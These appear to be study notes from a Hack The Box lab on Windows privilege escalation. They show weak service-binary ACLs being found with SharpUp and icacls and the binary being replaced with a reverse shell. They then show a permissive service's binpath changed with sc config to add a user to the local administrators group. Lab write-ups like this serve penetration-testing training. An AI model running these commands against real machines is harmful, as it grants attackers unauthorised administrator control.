# Weak Permissions

## Weak Permissions

we can find it in open source application and Custom Applications

## **Permissive File System ACLs**

### **Running SharpUp**

we use this tool to check for service binaries suffering from weak ACLs.

```powershell
PS C:\htb> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Service Binaries ===

  Name             : SecurityService
  **DisplayName      : PC Security Management Service**
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  **PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"**
  
  <SNIP>
```

The tool identifies the `PC Security Management Service`, which executes the `SecurityService.exe` binary when started.

### **Checking Permissions with icacls**

we can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\Users` groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.

```powershell
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe **BUILTIN\Users:(I)(F)**
                                                     **Everyone:(I)(F)**
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

### **Replacing Service Binary**

**this service startable by unprivileged users**

we can take a copy of this service(to clean up) and create a reverse shell then move it to the main file

```powershell
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```

***

***

## **Weak Service Permissions**

in this case the problem not in ACL for service but in this service (Service control manager)

### **Reviewing SharpUp Again**

We see the `WindscribeService` is potentially misconfigured.

```powershell
C:\htb> SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  **DisplayName      : WindscribeService**
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  **PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"**
```

### **Checking Permissions with AccessChk**

to check permission of this service

we found all Auth Users have all access

```powershell
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  **RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS**
```

### **Check Local Admin Group**

```powershell
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
mrb3n
The command completed successfully.
```

### **Changing the Service Binary Path**

Let's change it to add our user to the local administrator group.

```powershell
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```

### **Stopping & Starting Service**

```powershell
C:\htb> sc stop WindscribeService
C:\htb> sc start WindscribeService
```

### **Confirming Local Admin Group Addition**

```powershell
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
**htb-student**
mrb3n
The command completed successfully.
```

***

***

### **Check Startup Programs**

```powershell
PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

Name     : OneDrive
command  : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : Windscribe
command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : SecurityHealth
command  : %windir%\system32\SecurityHealthSystray.exe
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware User Process
command  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public
```
